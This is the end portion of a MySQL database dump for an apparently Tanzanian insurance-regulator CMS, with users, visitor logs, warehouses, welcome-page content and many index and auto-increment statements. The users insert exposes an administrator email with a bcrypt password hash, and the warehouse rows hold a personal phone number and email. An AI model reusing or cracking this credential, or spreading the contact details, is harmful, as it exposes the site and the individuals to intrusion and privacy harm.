INSERT INTO `users` (`id`, `name`, `email`, `email_verified_at`, `password`, `last_login`, `photo`, `expiring_date`, `remember_token`, `created_at`, `updated_at`) VALUES
(1, 'Administrator', 'admin@swahilicoders.go.tz', NULL, '$2a$12$aS2edLLX/lBmt/EpbMnmouOjQJzQlrjdccuwc8P0n4t55De1F2yES', '', '', '0000-00-00', NULL, '2020-06-14 04:31:13', '2021-10-08 02:49:10');

-- --------------------------------------------------------

--
-- Table structure for table `visitors_logs`
--

CREATE TABLE `visitors_logs` (
  `id` int(10) UNSIGNED NOT NULL,
  `browserId` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `browserName` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `browserVersion` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `userAgent` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `os` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `osVersion` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `visitors_logs`
--

INSERT INTO `visitors_logs` (`id`, `browserId`, `browserName`, `browserVersion`, `userAgent`, `os`, `osVersion`, `created_at`, `updated_at`) VALUES
(1, '3143104403', 'Chrome', '106.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', 'Windows', 'NT 10.0', '2022-10-18 04:18:27', '2022-10-18 20:40:03'),
(2, '3143104403', 'Chrome', '106.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', 'Windows', 'NT 10.0', '2022-10-19 04:18:13', '2022-10-19 04:18:27');

-- --------------------------------------------------------

--
-- Table structure for table `warehouses`
--

CREATE TABLE `warehouses` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `warehouses`
--

INSERT INTO `warehouses` (`id`, `name`, `phone`, `email`, `location`, `active`, `slug`, `created_at`, `updated_at`) VALUES
(1, 'Mnazi juuu kusini', '0692261066', 'engotheta@gmail.com', 'Dar es salaam, Kurasini', 1, 'mnazi-juuu-kusini', '2022-06-30 20:47:08', '2022-06-30 20:47:08'),
(2, 'Northen high way', '069226104', 'engotheta@gmail.com', 'Iringa, Kaskazin', 1, 'mnazi-juuu-kusini', '2022-06-30 20:47:08', '2022-06-30 20:47:08'),
(3, 'Ilemela temeke', '0692261066', 'engotheta@gmail.com', 'Dar es salaam, Kurasini', 1, 'mnazi-juuu-kusini', '2022-06-30 20:47:08', '2022-06-30 20:47:08'),
(4, 'Mbeya soweto', '069226104', 'engotheta@gmail.com', 'Iringa, Kaskazin', 1, 'mnazi-juuu-kusini', '2022-06-30 20:47:08', '2022-06-30 20:47:08');

-- --------------------------------------------------------

--
-- Table structure for table `welcome`
--

CREATE TABLE `welcome` (
  `id` int(11) NOT NULL,
  `summary_en` text DEFAULT NULL,
  `summary_sw` text DEFAULT NULL,
  `content_sw` text DEFAULT NULL,
  `content_en` text DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT 1,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `welcome`
--

INSERT INTO `welcome` (`id`, `summary_en`, `summary_sw`, `content_sw`, `content_en`, `status`, `created_at`, `updated_at`) VALUES
(2, NULL, NULL, '<p>TIRA is established under the the Insurance Act No.10 of 2009 as Follows:-</p>\r\n\r\n<ul>\r\n	<li>There is established a body to be known as the Tanzania Insurance Regulatory Authority.</li>\r\n	<li>Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic.</li>\r\n	<li>The&nbsp; Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (a) Capable of suing and being sued;<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (b) Capable of borrowing money,acquiring and disposing of property ;and<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (c) Capable of doing all other things which a body corporate may lawful do.</li>\r\n</ul>', '<p>TIRA is established under the the Insurance Act No.10 of 2009 as Follows:-</p>\r\n\r\n<ul>\r\n	<li>There is established a body to be known as the Tanzania Insurance Regulatory Authority.</li>\r\n	<li>Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic.</li>\r\n	<li>The&nbsp; Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (a) Capable of suing and being sued;<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (b) Capable of borrowing money,acquiring and disposing of property ;and<br />\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (c) Capable of doing all other things which a body corporate may lawful do.</li>\r\n</ul>', 1, '2022-08-07 16:13:16', '2022-08-07 13:13:16');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `about_links`
--
ALTER TABLE `about_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `achievements`
--
ALTER TABLE `achievements`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `activity_log`
--
ALTER TABLE `activity_log`
  ADD PRIMARY KEY (`id`),
  ADD KEY `activity_log_log_name_index` (`log_name`);

--
-- Indexes for table `administration_categories`
--
ALTER TABLE `administration_categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `administration_categories_members`
--
ALTER TABLE `administration_categories_members`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `administration_members`
--
ALTER TABLE `administration_members`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `announcements`
--
ALTER TABLE `announcements`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `backgrounds`
--
ALTER TABLE `backgrounds`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `campaigns`
--
ALTER TABLE `campaigns`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `colateral_managers`
--
ALTER TABLE `colateral_managers`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `communities`
--
ALTER TABLE `communities`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `community_categories`
--
ALTER TABLE `community_categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `complainants`
--
ALTER TABLE `complainants`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `complaints`
--
ALTER TABLE `complaints`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `dg_messages`
--
ALTER TABLE `dg_messages`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `documents`
--
ALTER TABLE `documents`
  ADD PRIMARY KEY (`id`),
  ADD KEY `publications_category_id_index` (`category_id`);

--
-- Indexes for table `document_categories`
--
ALTER TABLE `document_categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `events`
--
ALTER TABLE `events`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `faqs`
--
ALTER TABLE `faqs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `galleries`
--
ALTER TABLE `galleries`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `google_maps`
--
ALTER TABLE `google_maps`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `home_links`
--
ALTER TABLE `home_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `hospitals`
--
ALTER TABLE `hospitals`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `how_do_i`
--
ALTER TABLE `how_do_i`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ict_links`
--
ALTER TABLE `ict_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `important_links`
--
ALTER TABLE `important_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `licensed_entities`
--
ALTER TABLE `licensed_entities`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `licensed_entity_categories`
--
ALTER TABLE `licensed_entity_categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `media`
--
ALTER TABLE `media`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `media_links`
--
ALTER TABLE `media_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `menus`
--
ALTER TABLE `menus`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `menu_items`
--
ALTER TABLE `menu_items`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `model_has_permissions`
--
ALTER TABLE `model_has_permissions`
  ADD PRIMARY KEY (`permission_id`,`model_id`,`model_type`),
  ADD KEY `model_has_permissions_model_id_model_type_index` (`model_id`,`model_type`);

--
-- Indexes for table `model_has_roles`
--
ALTER TABLE `model_has_roles`
  ADD PRIMARY KEY (`role_id`,`model_id`,`model_type`),
  ADD KEY `model_has_roles_model_id_model_type_index` (`model_id`,`model_type`);

--
-- Indexes for table `more_infos`
--
ALTER TABLE `more_infos`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `news`
--
ALTER TABLE `news`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `online_services`
--
ALTER TABLE `online_services`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `operators`
--
ALTER TABLE `operators`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `pages`
--
ALTER TABLE `pages`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `page_categories`
--
ALTER TABLE `page_categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `partners`
--
ALTER TABLE `partners`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `password_resets`
--
ALTER TABLE `password_resets`
  ADD KEY `password_resets_email_index` (`email`);

--
-- Indexes for table `permissions`
--
ALTER TABLE `permissions`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `preferences`
--
ALTER TABLE `preferences`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `press_releases`
--
ALTER TABLE `press_releases`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `products`
--
ALTER TABLE `products`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `product_categories`
--
ALTER TABLE `product_categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `projects`
--
ALTER TABLE `projects`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `quicklink_categories`
--
ALTER TABLE `quicklink_categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `quick_infos`
--
ALTER TABLE `quick_infos`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `quick_links`
--
ALTER TABLE `quick_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `quotes`
--
ALTER TABLE `quotes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `regional_offices`
--
ALTER TABLE `regional_offices`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `related_links`
--
ALTER TABLE `related_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `roles`
--
ALTER TABLE `roles`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `role_has_permissions`
--
ALTER TABLE `role_has_permissions`
  ADD PRIMARY KEY (`permission_id`,`role_id`),
  ADD KEY `role_has_permissions_role_id_foreign` (`role_id`);

--
-- Indexes for table `seo`
--
ALTER TABLE `seo`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `services`
--
ALTER TABLE `services`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `social_links`
--
ALTER TABLE `social_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `special_pages`
--
ALTER TABLE `special_pages`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `speeches`
--
ALTER TABLE `speeches`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `support_links`
--
ALTER TABLE `support_links`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `timelines`
--
ALTER TABLE `timelines`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `trainings`
--
ALTER TABLE `trainings`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `translations`
--
ALTER TABLE `translations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_email_unique` (`email`);

--
-- Indexes for table `visitors_logs`
--
ALTER TABLE `visitors_logs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `warehouses`
--
ALTER TABLE `warehouses`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `welcome`
--
ALTER TABLE `welcome`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `about_links`
--
ALTER TABLE `about_links`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `achievements`
--
ALTER TABLE `achievements`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `activity_log`
--
ALTER TABLE `activity_log`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `administration_categories`
--
ALTER TABLE `administration_categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `administration_categories_members`
--
ALTER TABLE `administration_categories_members`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=30;

--
-- AUTO_INCREMENT for table `administration_members`
--
ALTER TABLE `administration_members`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=24;

--
-- AUTO_INCREMENT for table `announcements`
--
ALTER TABLE `announcements`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `backgrounds`
--
ALTER TABLE `backgrounds`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `campaigns`
--
ALTER TABLE `campaigns`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `colateral_managers`
--
ALTER TABLE `colateral_managers`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `communities`
--
ALTER TABLE `communities`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `community_categories`
--
ALTER TABLE `community_categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `complainants`
--
ALTER TABLE `complainants`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `complaints`
--
ALTER TABLE `complaints`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=224;

--
-- AUTO_INCREMENT for table `dg_messages`
--
ALTER TABLE `dg_messages`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `documents`
--
ALTER TABLE `documents`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;

--
-- AUTO_INCREMENT for table `document_categories`
--
ALTER TABLE `document_categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;

--
-- AUTO_INCREMENT for table `events`
--
ALTER TABLE `events`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `faqs`
--
ALTER TABLE `faqs`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `galleries`
--
ALTER TABLE `galleries`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `google_maps`
--
ALTER TABLE `google_maps`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `home_links`
--
ALTER TABLE `home_links`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `hospitals`
--
ALTER TABLE `hospitals`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `how_do_i`
--
ALTER TABLE `how_do_i`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `ict_links`
--
ALTER TABLE `ict_links`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `important_links`
--
ALTER TABLE `important_links`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT for table `licensed_entities`
--
ALTER TABLE `licensed_entities`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=133;

--
-- AUTO_INCREMENT for table `licensed_entity_categories`
--
ALTER TABLE `licensed_entity_categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT for table `media`
--
ALTER TABLE `media`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;

--
-- AUTO_INCREMENT for table `media_links`
--
ALTER TABLE `media_links`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `menus`
--
ALTER TABLE `menus`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `menu_items`
--
ALTER TABLE `menu_items`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=165;

--
-- AUTO_INCREMENT for table `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=69;

--
-- AUTO_INCREMENT for table `more_infos`
--
ALTER TABLE `more_infos`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT for table `news`
--
ALTER TABLE `news`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- AUTO_INCREMENT for table `online_services`
--
ALTER TABLE `online_services`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `operators`
--
ALTER TABLE `operators`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `pages`
--
ALTER TABLE `pages`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- AUTO_INCREMENT for table `page_categories`
--
ALTER TABLE `page_categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `partners`
--
ALTER TABLE `partners`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `permissions`
--
ALTER TABLE `permissions`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=426;

--
-- AUTO_INCREMENT for table `preferences`
--
ALTER TABLE `preferences`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `press_releases`
--
ALTER TABLE `press_releases`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `products`
--
ALTER TABLE `products`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `product_categories`
--
ALTER TABLE `product_categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `projects`
--
ALTER TABLE `projects`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `quicklink_categories`
--
ALTER TABLE `quicklink_categories`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `quick_infos`
--
ALTER TABLE `quick_infos`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `quick_links`
--
ALTER TABLE `quick_links`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `quotes`
--
ALTER TABLE `quotes`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `regional_offices`
--
ALTER TABLE `regional_offices`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `related_links`
--
ALTER TABLE `related_links`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `roles`
--
ALTER TABLE `roles`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `seo`
--
ALTER TABLE `seo`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `services`
--
ALTER TABLE `services`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `social_links`
--
ALTER TABLE `social_links`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `special_pages`
--
ALTER TABLE `special_pages`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `speeches`
--
ALTER TABLE `speeches`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `support_links`
--
ALTER TABLE `support_links`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `timelines`
--
ALTER TABLE `timelines`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `trainings`
--
ALTER TABLE `trainings`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `translations`
--
ALTER TABLE `translations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=378;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `visitors_logs`
--
ALTER TABLE `visitors_logs`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `warehouses`
--
ALTER TABLE `warehouses`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `welcome`
--
ALTER TABLE `welcome`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
